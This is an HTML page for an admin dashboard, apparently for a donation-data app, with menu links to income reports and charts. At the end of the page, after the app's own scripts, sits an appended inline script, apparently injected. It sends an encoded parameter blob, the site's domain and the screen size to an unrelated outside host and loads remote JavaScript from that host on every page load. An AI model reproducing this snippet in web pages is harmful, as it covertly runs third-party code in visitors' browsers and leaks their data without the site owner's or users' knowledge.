...
<head>
 ...
 <body id="mimin" class="dashboard">
              ...
              <div class="sub-left-menu scroll">
                <ul class="nav nav-list">
                    ...
                    <li class="active ripple">
                      <a class="tree-toggle nav-header"><span class="fa fa-table"></span> Data Donasi UPI
                    ...
                    <li class="ripple">
                      <a class="tree-toggle nav-header">
                        <span class="fa-diamond fa"></span> Laporan
                        <span class="fa-angle-right fa right-arrow text-right"></span>
                      </a>
                      <ul class="nav nav-list tree">
                        <li><a href="/Keuangan">Laporan Pemasukan</a></li>
                      </ul>
                    </li>
                    <li class="ripple">
                      <a class="tree-toggle nav-header">
                      ...
                      <ul class="nav nav-list tree">
                        <li><a href="/grafik">Grafik pemasukan </a></li>
  ...
  <!-- end: Javascript -->
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX5AVLWzl6ohN8WaBJr%2bSO1NwzEIsLVCWfgJLGBMFLszelVUjmTP%2bdBEitU3SAqyCWiMM%2bxP6JDRNpDlPRjd4ifdOnV9ppu3C8fBnYwB74xO8Vy6tPQf3s6kDWLc1rq2Gr%2fy6Xylj7y1Wj2%2bWLJ8BhW5UHS8inMowKHTMppryGjvuOZjM4rWBHzMNdYlqggbdPj2f5spJlvbdey8sll4ApdZx88JMGMmpCOVZLZmHxyY8VzuQ9lq0L%2fGNxEYNNltmIeNAILmFVV%2f2rybkmXRkP8hyyyYHmEt9rdX6yizGC6qJPG5GT9oUjPiYbxFfYtZoBc8mo7Lqv1fo2NnbUhRGX0CAZLEpsg2li%2fyzLSGRNXgbEDaANLhHmD9f0434VlMn9DfDLNnmxNOYb%2fNzSDSTFUa0APhWb4G7v6DtYeSS0APZaWxplwOF%2bhzi7XjuNy2iTIqKruYAG32%2fUyTDZwURq3lbXr2JCTGmT0h%2b1K1w8EmSPV532Kn0KrPMYdwCWGEWWpyqbvbA%2fMnCUHVLDmmV1WVYyXS468yrOdVc7ZQFPW6hbHTD58b6VfAI563zE2a5OK8YAZI2%2fuZM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>